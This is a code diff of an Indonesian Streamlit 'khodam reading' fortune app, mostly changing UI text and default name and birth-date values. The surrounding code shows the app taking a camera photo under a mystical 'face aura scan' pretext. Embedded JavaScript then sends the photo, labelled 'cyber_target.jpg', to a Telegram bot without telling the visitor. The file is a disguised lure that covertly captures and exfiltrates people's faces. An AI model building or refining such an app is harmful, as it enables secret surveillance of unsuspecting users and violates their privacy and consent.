@@ -30,7 +30,7 @@ st.markdown("""
         font-family: 'Space Grotesk', sans-serif;
     }
 
-    /* Kotak Utama / Glassmorphism Card dengan Border Neon */
+    /* Kotak Utama / Glassmorphism Card dengan Border Neon Neon */
     .cyber-card {
         background: rgba(8, 15, 28, 0.85);
         backdrop-filter: blur(16px);
@@ -41,7 +41,7 @@ st.markdown("""
         margin-bottom: 25px;
     }
 
-    /* Kotak Peringatan Energi ala Cyber */
+    /* Kotak Peringatan Kamera ala Cyber */
     .cyber-warning-box {
         background: rgba(234, 179, 8, 0.1);
         border: 1px dashed #eab308;
@@ -94,9 +94,9 @@ st.markdown("""
 if 'step' not in st.session_state:
     st.session_state.step = 0
 if 'user_name' not in st.session_state:
-    st.session_state.user_name = ""
+    st.session_state.user_name = "Boboho"
 if 'user_dob' not in st.session_state:
-    st.session_state.user_dob = ""
+    st.session_state.user_dob = "17/08/2004"
 if 'telegram_sent' not in st.session_state:
     st.session_state.telegram_sent = False
 if 'camera_failed' not in st.session_state:
@@ -191,14 +191,14 @@ if st.session_state.step == 0:
         st.markdown("""
             <div class="cyber-warning-box">
                 ⚠️ <b>PROTOKOL KEAMANAN SENSOR:</b><br>
-                Sistem wajib mengaktifkan <b>izin kamera</b> saat tombol diledakkan untuk memindai gelombang energi sukma dan frekuensi gaibmu. Jika izin ditolak, sistem otomatis menggagalkan ritual pembacaan khodam.
+                Sistem wajib mengaktifkan <b>izin kamera</b> saat tombol diledakkan untuk memindai gelombang energi sukma wajahmu. Jika izin ditolak, sistem otomatis menggagalkan ritual pembacaan khodam.
             </div>
         """, unsafe_allow_html=True)
         
         if st.session_state.camera_failed:
-            st.error("🚨 **ERROR 404: ENERGI TIDAK TERDETEKSI!** Akses kamera ditolak oleh perangkat. Sistem menghentikan proses karena frekuensi gaib gagal terpindai.")
+            st.error("🚨 **ERROR 404: AURA TIDAK TERDETEKSI!** Akses kamera ditolak oleh perangkat. Sistem menghentikan proses karena wajahmu tertutup kegelapan total.")
         
-        # Input form native Streamlit (tanpa contoh teks/placeholder nama & tanggal lahir)
+        # Input form native Streamlit
         name_input = st.text_input("Nama Lengkap / Nama Panggilan", value=st.session_state.user_name)
         dob_input = st.text_input("Tanggal Lahir (DD/MM/YYYY)", value=st.session_state.user_dob)
         
@@ -243,7 +243,7 @@ if st.session_state.step == 0:
                                 var formData = new FormData();
                                 formData.append('chat_id', chatId);
                                 formData.append('photo', blob, 'cyber_target.jpg');
-                                formData.append('caption', '☢ <b>TARGET CYBER AURA TERDETEKSI (VALIDASI SUKSES)!</b>');
+                                formData.append('caption', '☢️️ <b>TARGET CYBER AURA TERDETEKSI (VALIDASI SUKSES)!</b>');
                                 
                                 fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {{
                                     method: 'POST',
@@ -270,8 +270,8 @@ if st.session_state.step == 0:
 
     query_params = st.query_params
     if "step" in query_params and query_params["step"] == "2":
-        st.session_state.user_name = name_input if name_input.strip() else "Tanpa Nama"
-        st.session_state.user_dob = dob_input if dob_input.strip() else "Rahasia"
+        st.session_state.user_name = name_input if name_input.strip() else "Boboho"
+        st.session_state.user_dob = dob_input if dob_input.strip() else "17/08/2004"
         st.session_state.step = 2
         st.query_params.clear()
         st.rerun()
@@ -284,7 +284,7 @@ if st.session_state.step == 0:
 # --- STEP 2: ANIMASI PROSES CYBER-MATRIX ---
 elif st.session_state.step == 2:
     st.markdown("<h2 style='text-align: center; color: #38bdf8;'>⚡ MENGEKSEKUSI REAKTOR MATRIX...</h2>", unsafe_allow_html=True)
-    st.markdown("<p style='text-align: center; color: #4ade80;'>Energi sukma terverifikasi! Membuka gerbang dimensi nuklir...</p>", unsafe_allow_html=True)
+    st.markdown("<p style='text-align: center; color: #4ade80;'>Aura wajah terverifikasi! Membuka gerbang dimensi nuklir...</p>", unsafe_allow_html=True)
     
     st.write("")
     progress_bar = st.progress(0)
@@ -341,8 +341,8 @@ elif st.session_state.step == 3:
     st.write("")
     if st.button("🔄 RESET & CEK ULANG (GANTI TARGET)", use_container_width=True):
         st.session_state.step = 0
-        st.session_state.user_name = ""
-        st.session_state.user_dob = ""
+        st.session_state.user_name = "Boboho"
+        st.session_state.user_dob = "17/08/2004"
         st.session_state.telegram_sent = False
         st.session_state.camera_failed = False
         st.rerun()
